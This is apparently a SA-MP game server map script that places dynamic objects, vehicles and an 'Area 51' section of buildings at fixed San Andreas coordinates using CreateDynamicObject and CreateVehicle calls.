CreateDynamicObject(3851, 413.58279, 2544.37671, 20.28360,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3851, 413.59369, 2546.01855, 20.28360,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3851, 407.93896, 2551.67065, 20.28360,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3851, 400.09869, 2551.65088, 20.28360,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3851, 394.43439, 2545.99365, 20.28360,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3851, 394.44830, 2544.35254, 20.28360,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19377, 408.38330, 2543.52417, 22.35600,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19377, 408.38290, 2546.85767, 22.33600,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19377, 399.70020, 2546.85181, 22.35600,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19466, 402.47809, 2538.71680, 17.61680,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19466, 399.10950, 2538.71167, 17.61680,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19466, 396.09741, 2538.70313, 17.61680,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19466, 408.80481, 2538.71655, 17.61680,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19466, 412.11819, 2538.70752, 17.61680,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19466, 413.62109, 2550.06519, 17.61680,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19466, 394.45349, 2550.01196, 17.61680,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1693, 410.84229, 2545.28516, 23.87591,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3396, 395.25662, 2549.40186, 15.54730,   0.00000, 0.00000, -180.00000);
CreateDynamicObject(3395, 395.25119, 2545.78320, 15.55970,   0.00000, 0.00000, -180.00000);
CreateDynamicObject(1998, 396.12372, 2539.32788, 15.65970,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(11631, 395.27429, 2542.38062, 16.87890,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(16782, 413.01929, 2541.00928, 17.52810,   0.00000, 0.00000, -180.00000);
CreateDynamicObject(16782, 413.01074, 2546.90479, 17.52810,   0.00000, 0.00000, -180.00000);
CreateDynamicObject(19164, 413.40231, 2543.94019, 17.51750,   0.00000, 90.00000, 180.00000);
CreateDynamicObject(3395, 398.76120, 2539.54956, 15.53970,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3396, 402.32660, 2539.57397, 15.56320,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(1715, 402.74185, 2541.63989, 15.65970,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1715, 399.59607, 2541.70947, 15.65970,   0.00000, 0.00000, 10.80000);
CreateDynamicObject(1715, 397.64758, 2541.36719, 15.65970,   0.00000, 0.00000, 61.56001);
CreateDynamicObject(1715, 396.64948, 2542.70093, 15.65970,   0.00000, 0.00000, -85.56002);
CreateDynamicObject(1715, 396.39386, 2540.49268, 15.65970,   0.00000, 0.00000, -68.58002);
CreateDynamicObject(1715, 397.24084, 2545.63013, 15.65970,   0.00000, 0.00000, -85.56002);
CreateDynamicObject(1715, 397.45084, 2548.94287, 15.65970,   0.00000, 0.00000, -108.78002);
CreateDynamicObject(3259, 371.27847, 2624.57178, 15.40715,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(10814, 377.69101, 2621.11938, 19.38669,   0.00000, 0.00000, 11.82000);
CreateDynamicObject(3287, 408.76099, 2594.90063, 19.74171,   0.00000, 0.00000, -78.11998);
CreateDynamicObject(3287, 410.01813, 2587.64941, 19.74171,   0.00000, 0.00000, -78.11998);
CreateDynamicObject(3287, 410.92822, 2580.47510, 19.74171,   0.00000, 0.00000, -78.11998);
CreateDynamicObject(19381, 386.72049, 2534.02246, 15.54720,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19381, 386.76880, 2544.50317, 15.54720,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19381, 386.80099, 2552.88135, 15.52720,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(3259, 355.42731, 2599.68604, 15.40715,   0.00000, 0.00000, -188.33995);
CreateDynamicObject(3396, 409.79626, 2539.59106, 15.56320,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(1715, 410.96024, 2540.97461, 15.65970,   0.00000, 0.00000, -130.38000);
CreateDynamicObject(18014, 401.53305, 2531.79272, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 401.53140, 2536.45068, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 398.87558, 2529.07959, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 394.23401, 2529.07349, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 389.61050, 2529.08179, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 384.97903, 2529.08154, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 382.23599, 2531.74585, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 382.23215, 2536.38721, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 382.22440, 2541.03027, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 382.22153, 2545.67212, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 382.22763, 2550.31421, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 382.23776, 2554.95581, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 384.89838, 2557.78271, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 389.53955, 2557.77173, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 390.87796, 2557.80444, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 399.30588, 2557.91235, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 403.95602, 2557.91870, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 408.59738, 2557.92725, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 413.19254, 2557.92114, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 417.83362, 2557.93726, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 422.47379, 2557.95093, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 427.11395, 2557.95459, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 430.11856, 2555.15747, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 430.11539, 2550.51563, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 430.11142, 2545.91504, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 430.10834, 2541.27417, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 430.11450, 2536.64038, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 430.11249, 2532.01538, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 427.61905, 2529.05835, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 422.97873, 2529.04272, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 418.33609, 2529.06152, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 413.68353, 2529.06592, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18014, 410.30933, 2531.84009, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 410.33673, 2536.42773, 15.98720,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 401.53171, 2529.04517, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 410.22867, 2529.04517, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18014, 412.89459, 2529.07153, 15.98720,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1215, 406.60156, 2538.51099, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 409.78314, 2538.57153, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 404.62201, 2538.51367, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 402.10361, 2538.52417, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 402.03503, 2534.14502, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 409.79034, 2534.21582, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 398.59201, 2532.67285, 15.04707,   0.00000, 0.00000, -22.50000);
CreateDynamicObject(822, 392.85526, 2532.91016, 15.04707,   0.00000, 0.00000, -22.50000);
CreateDynamicObject(822, 386.36172, 2531.56909, 15.04707,   0.00000, 0.00000, -121.26000);
CreateDynamicObject(822, 386.91605, 2537.22778, 15.04707,   0.00000, 0.00000, -121.26000);
CreateDynamicObject(822, 390.86935, 2542.06006, 15.04707,   0.00000, 0.00000, -121.26000);
CreateDynamicObject(822, 386.30991, 2548.15259, 15.04707,   0.00000, 0.00000, -121.26000);
CreateDynamicObject(822, 385.73599, 2553.84814, 15.04707,   0.00000, 0.00000, -121.26000);
CreateDynamicObject(822, 389.26392, 2553.73022, 15.04707,   0.00000, 0.00000, -188.33997);
CreateDynamicObject(822, 418.44751, 2553.20288, 15.04707,   0.00000, 0.00000, -188.33997);
CreateDynamicObject(822, 405.61331, 2554.95801, 15.04707,   0.00000, 0.00000, -281.99988);
CreateDynamicObject(822, 426.38419, 2554.05151, 15.04707,   0.00000, 0.00000, -220.55992);
CreateDynamicObject(1215, 430.27225, 2529.17065, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 429.79810, 2557.87622, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 396.75876, 2557.96387, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 393.31912, 2557.94336, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 382.30231, 2557.72290, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 382.20993, 2529.11816, 16.14340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 424.89194, 2544.37622, 15.04707,   0.00000, 0.00000, -245.15993);
CreateDynamicObject(822, 425.89206, 2532.73779, 15.04707,   0.00000, 0.00000, -245.15993);
CreateDynamicObject(822, 414.02969, 2532.00049, 15.04707,   0.00000, 0.00000, -245.15993);
CreateDynamicObject(822, 420.00110, 2536.66211, 15.04707,   0.00000, 0.00000, -313.97992);
CreateDynamicObject(710, 418.07959, 2534.43994, 20.05103,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(710, 387.30038, 2550.70947, 27.65231,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(669, 425.00256, 2554.88013, 15.40609,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(669, 426.29129, 2534.38110, 15.40609,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 346.13412, 2443.40625, 16.65828,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 342.92743, 2437.64478, 16.65828,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 334.05338, 2443.25220, 16.65828,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 340.91501, 2450.49780, 16.65828,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 339.27493, 2445.26147, 16.65828,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 323.67432, 2416.35840, 16.65828,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 317.22864, 2405.00977, 15.81659,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 319.44812, 2411.59106, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 316.70093, 2421.43530, 15.81659,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 312.09296, 2412.50977, 15.81659,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 311.18115, 2418.83887, 15.81659,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 293.71463, 2436.14429, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 288.33615, 2435.77075, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 294.15533, 2442.43311, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 280.71619, 2439.38623, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 287.85159, 2443.84424, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 284.75098, 2430.84473, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 269.58060, 2415.88940, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 257.34323, 2413.20898, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 266.60037, 2410.52441, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 264.03534, 2417.22217, 16.22263,   0.00000, 0.00000, -57.24000);
CreateDynamicObject(822, 260.92310, 2406.53613, 16.22263,   0.00000, 0.00000, -57.24000);
CreateDynamicObject(822, 259.34988, 2420.78125, 16.22263,   0.00000, 0.00000, -57.24000);
CreateDynamicObject(710, 339.70840, 2443.70850, 31.04280,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(710, 315.99503, 2415.04102, 31.04280,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 316.83206, 2416.51782, 15.81659,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(710, 289.56876, 2437.81738, 30.72749,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(710, 262.94089, 2413.95776, 31.04280,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 240.73672, 2437.15479, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 241.99899, 2443.73486, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 234.56548, 2437.07983, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 233.03236, 2445.89282, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 231.72939, 2441.61060, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 244.69370, 2441.60205, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(710, 236.45645, 2440.96362, 31.04280,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 236.65103, 2440.91089, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 236.19221, 2445.75195, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 216.01952, 2416.25146, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 208.93958, 2411.39600, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 203.17961, 2417.44897, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 205.24005, 2409.08545, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 215.95956, 2410.40332, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 212.59279, 2423.83594, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 208.46965, 2420.17773, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(710, 209.65303, 2416.79565, 31.04280,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 189.70430, 2441.33496, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 179.14821, 2444.30615, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 181.29915, 2434.30859, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 185.23030, 2445.84790, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 186.33392, 2438.16528, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 177.35649, 2440.38501, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(710, 183.22261, 2441.04688, 31.04280,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 183.74182, 2442.08521, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 160.99847, 2414.63550, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 157.48566, 2412.02002, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 152.05257, 2414.93774, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 155.90887, 2419.43799, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(710, 155.97549, 2415.56592, 31.04280,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 148.25125, 2419.56201, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 161.75642, 2420.55664, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(710, 130.05780, 2439.79443, 31.04280,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(710, 106.46564, 2412.40405, 31.04280,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 133.96489, 2436.36401, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 130.70740, 2446.50659, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 134.13470, 2441.03467, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 128.67178, 2435.71558, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 124.65353, 2442.43457, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 126.44067, 2446.55322, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 109.34698, 2412.95703, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 102.91694, 2411.31226, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 105.17270, 2419.21631, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 106.52092, 2408.93945, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(822, 101.18356, 2416.99414, 16.22263,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(10810, 192.86734, 2545.69995, 20.15310,   0.00000, 0.00000, -157.37991);
CreateDynamicObject(1682, 197.65395, 2544.41333, 31.09594,   0.00000, 0.00000, -185.15999);
CreateDynamicObject(1694, 427.39032, 2453.09351, 32.74586,   0.00000, 0.00000, 1.32001);
CreateDynamicObject(1694, 385.45541, 2453.12793, 32.74586,   0.00000, 0.00000, 89.64002);
CreateDynamicObject(9241, 249.48039, 2543.74561, 17.09390,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18981, 2.23410, 2521.91138, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 25.32003, 2530.87524, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -18.61716, 2528.27856, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(3852, 152.58440, 2535.87012, 17.22050,   0.00000, 0.00000, -88.20000);
CreateDynamicObject(18260, 436.16516, 2541.45386, 16.61230,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18260, 435.26678, 2548.93335, 16.61230,   0.00000, 0.00000, -134.63998);
CreateDynamicObject(18257, 439.63788, 2548.61450, 15.13798,   0.00000, 0.00000, 251.10001);
CreateDynamicObject(16327, 355.34753, 2460.70483, 15.24210,   0.00000, 0.00000, -89.58000);
CreateDynamicObject(3928, 358.56076, 2539.88379, 15.79176,   0.00000, 0.00000, -91.02000);
CreateDynamicObject(1635, 404.32230, 2552.27075, 17.69120,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19171, 399.38251, 2551.53784, 17.39420,   0.00000, 90.00000, -90.00000);
CreateDynamicObject(19170, 401.89789, 2551.53540, 17.40830,   0.00000, 90.00000, -90.00000);
CreateDynamicObject(19168, 404.50381, 2551.52661, 17.42240,   0.00000, 90.00000, -90.00000);
CreateDynamicObject(19169, 407.18829, 2551.53296, 17.43670,   0.00000, 90.00000, -90.00000);
CreateDynamicObject(3286, 366.20389, 2584.06396, 19.49115,   0.00000, 0.00000, 10.62000);
CreateDynamicObject(5836, 424.98688, 2572.65576, 27.47910,   0.00000, 0.00000, -27.72000);
CreateDynamicObject(1278, 376.48923, 2474.94751, 28.31585,   0.00000, 0.00000, 186.17993);
CreateDynamicObject(1278, 318.17636, 2444.74072, 28.31585,   0.00000, 0.00000, 186.17993);
CreateDynamicObject(1278, 263.96585, 2445.99487, 28.21179,   0.00000, 0.00000, 186.17993);
CreateDynamicObject(1278, 210.30260, 2445.19238, 28.21179,   0.00000, 0.00000, 186.17993);
CreateDynamicObject(1278, 156.90578, 2446.02197, 28.21179,   0.00000, 0.00000, 186.17993);
CreateDynamicObject(1278, 105.23293, 2446.89624, 28.21179,   0.00000, 0.00000, 186.17993);
CreateDynamicObject(1278, 431.87482, 2476.00098, 28.31585,   0.00000, 0.00000, 237.47989);
CreateDynamicObject(1278, 430.62070, 2528.95630, 28.31585,   0.00000, 0.00000, 334.62021);
CreateDynamicObject(1278, 394.23911, 2538.59961, 9.47779,   0.00000, 0.00000, 404.10028);
CreateDynamicObject(1278, 413.84494, 2538.57520, 9.47779,   0.00000, 0.00000, 298.74017);
CreateDynamicObject(1693, 398.76642, 2545.13281, 23.84350,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(1278, 307.26913, 2540.58667, 28.73894,   0.00000, 0.00000, 360.36017);
CreateDynamicObject(18981, 349.28381, 2532.00537, 15.05740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(1491, 404.87253, 2538.77734, 15.63335,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8209, 446.44543, 2522.12622, 18.42369,   0.00000, 0.00000, -88.37998);
CreateDynamicObject(8209, 448.66666, 2443.97412, 21.32121,   0.00000, 0.00000, -88.37998);
CreateDynamicObject(8209, 446.44543, 2522.12622, 21.30695,   -0.06000, -0.06000, -88.37998);
CreateDynamicObject(8209, 400.11618, 2395.23682, 21.28233,   0.00000, 0.00000, -181.55997);
CreateDynamicObject(8209, 400.11618, 2395.23682, 16.88855,   0.00000, 0.00000, -181.55997);
CreateDynamicObject(8209, 400.11618, 2395.23682, 16.88855,   0.00000, 0.00000, -181.55997);
CreateDynamicObject(8209, 300.89145, 2397.92773, 16.88855,   0.00000, 0.00000, -181.55997);
CreateDynamicObject(8209, 201.58055, 2400.64771, 16.88855,   0.00000, 0.00000, -181.55997);
CreateDynamicObject(8209, 120.44662, 2402.90576, 16.88855,   0.00000, 0.00000, -181.55997);
CreateDynamicObject(8209, 4.33123, 2405.95972, 16.88855,   0.00000, 0.00000, -181.55997);
CreateDynamicObject(8210, -96.52797, 2520.81689, 17.80293,   0.00000, 0.00000, 90.11998);
CreateDynamicObject(8210, -69.06816, 2549.91821, 18.30934,   0.00000, 0.00000, 1.97998);
CreateDynamicObject(8210, -13.57484, 2551.72168, 18.34055,   0.00000, 0.00000, 1.97998);
CreateDynamicObject(8210, 41.88572, 2553.61523, 18.34055,   0.00000, 0.00000, 1.97998);
CreateDynamicObject(8210, 97.35223, 2555.48413, 18.34055,   0.00000, 0.00000, 1.85998);
CreateDynamicObject(8210, 152.77086, 2557.04224, 18.34055,   0.00000, 0.00000, 1.49998);
CreateDynamicObject(8210, 315.02682, 2559.31421, 18.34055,   0.00000, 0.00000, 0.53998);
CreateDynamicObject(8210, 341.08813, 2586.73169, 18.34055,   0.00000, 0.00000, 92.93997);
CreateDynamicObject(8210, 338.06653, 2642.08228, 17.67789,   0.00000, 0.00000, 93.41998);
CreateDynamicObject(8210, 364.97583, 2654.21118, 17.32359,   0.00000, 0.00000, 3.47998);
CreateDynamicObject(8210, 364.97583, 2654.21118, 24.24139,   0.00000, 0.00000, 3.47998);
CreateDynamicObject(8210, 259.57462, 2558.84399, 18.34055,   0.00000, 0.00000, 0.53998);
CreateDynamicObject(8210, 204.23662, 2558.13794, 18.34055,   0.00000, 0.00000, 1.07998);
CreateDynamicObject(8210, -96.44384, 2480.89404, 17.80293,   0.00000, 0.00000, 90.11998);
CreateDynamicObject(3749, -89.52850, 2445.89404, 19.98304,   0.00000, 0.00000, -60.71999);
CreateDynamicObject(3749, -81.95898, 2432.33496, 19.98304,   0.00000, 0.00000, -60.71999);
CreateDynamicObject(987, -76.15546, 2423.52417, 14.07600,   0.00000, 0.00000, -41.28000);
CreateDynamicObject(987, -67.11431, 2415.75464, 16.46762,   0.00000, 0.00000, -31.62001);
CreateDynamicObject(987, -57.04429, 2409.53027, 16.47889,   0.00000, 0.00000, -8.46000);
CreateDynamicObject(987, -67.11431, 2415.75464, 12.44569,   -0.06000, 0.06000, -31.62001);
CreateDynamicObject(16093, 105.78348, 2463.51904, 15.33486,   0.00000, 0.00000, -181.50008);
CreateDynamicObject(16093, 99.58029, 2463.75879, 15.33486,   0.00000, 0.00000, -181.50008);
CreateDynamicObject(3749, 61.87883, 2406.51807, 21.04046,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8038, 10.71290, 2454.03638, 35.53599,   0.00000, 0.00000, -90.54000);
CreateDynamicObject(18981, 48.87532, 2516.26636, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(9241, 130.87334, 2542.09644, 16.99782,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(9241, 103.71351, 2541.60522, 16.99782,   0.00000, 0.00000, 90.00000);
//Vehicles//
CreateVehicle(476, 325.3421, 2540.7036, 17.5985, 177.8401, -1, -1, 100);
CreateVehicle(476, 290.3716, 2540.9453, 17.5985, 177.9601, -1, -1, 100);
CreateVehicle(447, 358.6077, 2539.0754, 16.6134, 178.9199, -1, -1, 100);
CreateVehicle(425, 250.3081, 2543.8015, 19.5552, 179.8200, -1, -1, 100);
CreateVehicle(520, 422.1571, 2490.8110, 17.2802, 89.7000, -1, -1, 100);
CreateVehicle(520, 421.8948, 2514.3105, 17.2802, 89.7000, -1, -1, 100);
CreateVehicle(487, 104.1830, 2541.4175, 18.8573, 179.3399, -1, -1, 100);
CreateVehicle(487, 131.4773, 2542.1924, 18.8573, 179.3399, -1, -1, 100);
CreateVehicle(432, 416.9009, 2447.9060, 16.4226, 0.0000, -1, -1, 100);
CreateVehicle(432, 404.7089, 2447.7725, 16.4226, 0.0000, -1, -1, 100);
CreateVehicle(432, 393.2254, 2447.7878, 16.4226, 0.0000, -1, -1, 100);
CreateVehicle(470, 330.6777, 2466.1394, 16.1618, 0.0000, -1, -1, 100);
CreateVehicle(470, 326.3915, 2466.1689, 16.1618, 0.0000, -1, -1, 100);
CreateVehicle(470, 330.6777, 2466.1394, 16.1618, 0.0000, -1, -1, 100);
CreateVehicle(470, 322.0192, 2465.9741, 16.1618, -0.3600, -1, -1, 100);
CreateVehicle(470, 330.6777, 2466.1394, 16.1618, 0.0000, -1, -1, 100);
CreateVehicle(470, 326.3915, 2466.1689, 16.1618, 0.0000, -1, -1, 100);
CreateVehicle(470, 318.3551, 2465.9893, 16.1618, -0.6000, -1, -1, 100);
CreateVehicle(427, 299.9365, 2469.0930, 16.4833, 0.0000, -1, -1, 100);
CreateVehicle(427, 295.5525, 2469.0481, 16.4833, 0.0000, -1, -1, 100);
CreateVehicle(468, 278.1907, 2468.7185, 16.0369, 0.0000, -1, -1, 100);
CreateVehicle(468, 276.8547, 2468.7305, 16.0369, 0.0000, -1, -1, 100);
CreateVehicle(468, 278.1907, 2468.7185, 16.0369, 0.0000, -1, -1, 100);
CreateVehicle(468, 275.4277, 2468.8442, 16.0369, 0.0000, -1, -1, 100);
CreateVehicle(468, 274.0525, 2468.9468, 16.0369, 0.0000, -1, -1, 100);
CreateVehicle(468, 272.8026, 2468.8794, 16.0369, 0.0000, -1, -1, 100);
CreateVehicle(495, 260.4802, 2469.5105, 16.6538, 0.0000, -1, -1, 100);
CreateVehicle(495, 254.9048, 2469.6362, 16.6538, 0.0000, -1, -1, 100);
//Area 51
CreateDynamicObject(8150, 96.60000, 2002.19995, 20.40000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3268, 115.09961, 1960.39941, 18.10000,   0.00000, 0.00000, 179.99451);
CreateDynamicObject(3268, 115.29980, 1994.39941, 18.00000,   0.00000, 0.00000, 179.99451);
CreateDynamicObject(3279, 192.80000, 1803.09998, 16.60000,   0.00000, 0.00000, 179.99451);
CreateDynamicObject(3268, 200.50000, 1980.00000, 16.60000,   0.00000, 0.00000, 179.99451);
CreateDynamicObject(3268, 200.39999, 2015.90002, 16.60000,   0.00000, 0.00000, 179.99451);
CreateDynamicObject(9241, 339.48874, 1992.53455, 18.70000,   0.00000, 0.00000, 269.99451);
CreateDynamicObject(9241, 364.13248, 1992.50623, 18.70000,   0.00000, 0.00000, 89.99451);
CreateDynamicObject(9241, 338.89941, 1866.19922, 18.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8038, 374.39941, 1933.09961, 36.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3279, 384.70001, 2076.60010, 16.60000,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(3279, 183.89999, 2059.89990, 20.80000,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(3279, 103.80000, 2060.50000, 16.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 97.10000, 2078.89990, 16.60000,   0.00000, 0.00000, 89.99951);
